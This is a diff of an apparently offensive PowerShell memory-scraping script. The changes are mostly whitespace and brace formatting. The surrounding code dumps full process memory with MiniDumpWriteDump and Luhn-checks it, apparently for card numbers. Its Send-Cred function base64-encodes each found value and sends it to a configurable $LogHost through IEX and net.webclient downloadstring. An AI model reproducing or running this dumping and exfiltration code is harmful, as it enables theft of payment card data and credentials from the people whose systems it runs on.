@@ -96,12 +96,12 @@ Great script, have been adopting it slowly
 			$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
 	
 			$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
-														$ProcessId,
-														$FileStream.SafeFileHandle,
-														$MiniDumpWithFullMemory,
-														[IntPtr]::Zero,
-														[IntPtr]::Zero,
-														[IntPtr]::Zero))
+									$ProcessId,
+									$FileStream.SafeFileHandle,
+									$MiniDumpWithFullMemory,
+									[IntPtr]::Zero,
+									[IntPtr]::Zero,
+									[IntPtr]::Zero))
 	
 			$FileStream.Close()
 	
@@ -124,7 +124,8 @@ Great script, have been adopting it slowly
 	}
 	
 	# Luhncheck code sourced from: http://scriptolog.blogspot.com/2008/01/powershell-luhn-validation.html
-	function Test-LuhnNumber([int[]]$digits){
+	function Test-LuhnNumber([int[]]$digits)
+	{
 	
 		[int]$sum=0
 		[bool]$alt=$false
@@ -152,14 +153,17 @@ Great script, have been adopting it slowly
 			{ Write-Host "[$timestamp] - $logstring" -ForegroundColor $color }
 	}
 	
-	function Send-Cred($cred) {
-		if ($LogHost) {
+	function Send-Cred($cred) 
+	{
+		if ($LogHost) 
+		{
 			$cred = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cred.Value))
 			IEX (new-object net.webclient).downloadstring("http://$LogHost/$cred") -ErrorAction SilentlyContinue
 		}
 	}
 	
-	function main {
+	function main 
+	{
 	
 		# Save mem dumps to present working directory
 		$dest = $PWD
